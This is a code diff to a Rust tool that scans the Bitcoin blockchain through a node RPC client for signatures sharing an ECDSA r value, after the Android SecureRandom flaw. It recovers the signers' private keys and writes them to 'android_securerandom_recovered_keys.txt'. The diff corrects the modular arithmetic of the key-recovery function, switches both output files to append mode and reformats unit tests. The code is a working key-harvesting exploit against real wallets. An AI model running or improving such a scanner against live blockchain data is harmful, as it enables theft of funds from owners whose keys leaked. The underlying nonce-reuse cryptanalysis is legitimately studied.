@@ -4,6 +4,7 @@ use bitcoincore_rpc::{Auth, Client, RpcApi};
 use num_bigint::BigInt;
 use num_traits::{One, Zero};
 use std::collections::HashMap;
+use std::fs::OpenOptions;
 use std::io::Write;
 
 // Type alias to simplify complex signature data structure
@@ -216,8 +217,9 @@ fn recover_private_key_from_duplicate_r(
     let m2_int = bytes_to_bigint(m2);
 
     // Calculate k = (m1 - m2) / (s1 - s2) mod n
-    let m_diff = (&m1_int - &m2_int).modpow(&BigInt::one(), &n);
-    let s_diff = (&s1_int - &s2_int).modpow(&BigInt::one(), &n);
+    // Handle negative results properly by adding n before final modulo
+    let m_diff = ((&m1_int - &m2_int) % &n + &n) % &n;
+    let s_diff = ((&s1_int - &s2_int) % &n + &n) % &n;
 
     // Check if s1 == s2 (would cause division by zero)
     if s_diff.is_zero() {
@@ -225,13 +227,13 @@ fn recover_private_key_from_duplicate_r(
     }
 
     let s_diff_inv = mod_inverse(&s_diff, &n)?;
-    let k = (&m_diff * &s_diff_inv).modpow(&BigInt::one(), &n);
+    let k = (&m_diff * &s_diff_inv) % &n;
 
     // Calculate private_key = (s1 * k - m1) / r mod n
-    let sk_product = (&s1_int * &k).modpow(&BigInt::one(), &n);
-    let numerator = (&sk_product - &m1_int).modpow(&BigInt::one(), &n);
+    let sk_product = (&s1_int * &k) % &n;
+    let numerator = ((&sk_product - &m1_int) % &n + &n) % &n;
     let r_inv = mod_inverse(&r_int, &n)?;
-    let private_key_int = (&numerator * &r_inv).modpow(&BigInt::one(), &n);
+    let private_key_int = (&numerator * &r_inv) % &n;
 
     // Convert to 32-byte secret key
     let sk_bytes =
@@ -391,7 +393,7 @@ pub fn run(
                                                     hex::encode(public_key.serialize())
                                                 );
 
-                                                // Write recovery results to file
+                                                // Write recovery results to file (append mode)
                                                 let recovery_data = format!(
                                                     "PRIVATE KEY RECOVERED!\n\
                                                      R value: {}\n\
@@ -408,10 +410,13 @@ pub fn run(
                                                     hex::encode(public_key.serialize())
                                                 );
 
-                                                std::fs::write(
-                                                    "android_securerandom_recovered_keys.txt",
-                                                    recovery_data,
-                                                )?;
+                                                let mut file = OpenOptions::new()
+                                                    .create(true)
+                                                    .append(true)
+                                                    .open(
+                                                        "android_securerandom_recovered_keys.txt",
+                                                    )?;
+                                                file.write_all(recovery_data.as_bytes())?;
                                             }
                                             Err(e) => {
                                                 println!(
@@ -420,23 +425,26 @@ pub fn run(
                                                 );
                                                 println!("This may be due to missing sighash data or other issues.");
 
-                                                // Still write the duplicate finding to file
-                                                std::fs::write(
-                                                    "android_securerandom_hits.txt",
-                                                    format!(
-                                                        "Duplicate R value found!\n\
-                                                         R: {}\n\
-                                                         Tx1: {}\n\
-                                                         Tx2: {}\n\
-                                                         Block: {}\n\
-                                                         Recovery Error: {}\n\n",
-                                                        hex::encode(&r_value),
-                                                        entry[0].0,
-                                                        txid,
-                                                        block_height,
-                                                        e
-                                                    ),
-                                                )?;
+                                                // Still write the duplicate finding to file (append mode)
+                                                let error_data = format!(
+                                                    "Duplicate R value found!\n\
+                                                     R: {}\n\
+                                                     Tx1: {}\n\
+                                                     Tx2: {}\n\
+                                                     Block: {}\n\
+                                                     Recovery Error: {}\n\n",
+                                                    hex::encode(&r_value),
+                                                    entry[0].0,
+                                                    txid,
+                                                    block_height,
+                                                    e
+                                                );
+
+                                                let mut file = OpenOptions::new()
+                                                    .create(true)
+                                                    .append(true)
+                                                    .open("android_securerandom_hits.txt")?;
+                                                file.write_all(error_data.as_bytes())?;
                                             }
                                         }
                                     }
@@ -483,21 +491,18 @@ mod tests {
             0x30, 0x44, // DER header, total length 68
             0x02, 0x20, // r marker and length (32 bytes)
             // 32 bytes of r value
-            0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
-            0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10,
-            0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18,
-            0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20,
-            0x02, 0x20, // s marker and length (32 bytes)
+            0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e,
+            0x0f, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c,
+            0x1d, 0x1e, 0x1f, 0x20, 0x02, 0x20, // s marker and length (32 bytes)
             // 32 bytes of s value
-            0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28,
-            0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e, 0x2f, 0x30,
-            0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
-            0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f, 0x40,
+            0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e,
+            0x2f, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c,
+            0x3d, 0x3e, 0x3f, 0x40,
         ];
 
         let result = extract_signature_components(&der_sig);
         assert!(result.is_ok());
-        
+
         let (r, s) = result.unwrap();
         assert_eq!(r.len(), 32);
         assert_eq!(s.len(), 32);
@@ -518,7 +523,7 @@ mod tests {
         let big = BigInt::from(12345u32);
         let result = bigint_to_32bytes(&big);
         assert!(result.is_some());
-        
+
         let bytes = result.unwrap();
         assert_eq!(bytes.len(), 32);
         // Should be padded with zeros and have 12345 at the end
@@ -533,7 +538,7 @@ mod tests {
         let m = BigInt::from(7);
         let result = mod_inverse(&a, &m);
         assert!(result.is_ok());
-        
+
         let inv = result.unwrap();
         let product = (&a * &inv) % &m;
         assert_eq!(product, BigInt::one());
@@ -543,24 +548,24 @@ mod tests {
     fn test_recover_private_key_with_known_values() {
         // This is a simplified test with small values
         // In reality, these would be 256-bit values from secp256k1
-        
+
         // For this test, we'll verify the mathematical relationship
         // k = (m1 - m2) / (s1 - s2) mod n
         // private_key = (s * k - m) / r mod n
-        
+
         // We can't easily test with real ECDSA values without a full test vector,
         // but we can verify the function compiles and handles basic cases
-        
+
         let r = vec![0x01; 32];
         let s1 = vec![0x02; 32];
         let s2 = vec![0x03; 32];
         let m1 = vec![0x04; 32];
         let m2 = vec![0x05; 32];
-        
+
         // This will likely produce an invalid key (which is expected for random test data)
         // but it tests that the function doesn't panic
         let result = recover_private_key_from_duplicate_r(&r, &s1, &s2, &m1, &m2);
-        
+
         // The function should complete without panicking
         // It might fail to create a valid SecretKey, which is fine for this test data
         assert!(result.is_ok() || result.is_err());
@@ -573,7 +578,7 @@ mod tests {
         script.push(0x02); // Compressed pubkey marker
         script.extend_from_slice(&[0xFF; 32]); // 32 more bytes
         script.extend_from_slice(&[0x00; 10]); // Some trailing data
-        
+
         let result = extract_pubkey_from_script(&script);
         assert!(result.is_some());
         let pubkey = result.unwrap();
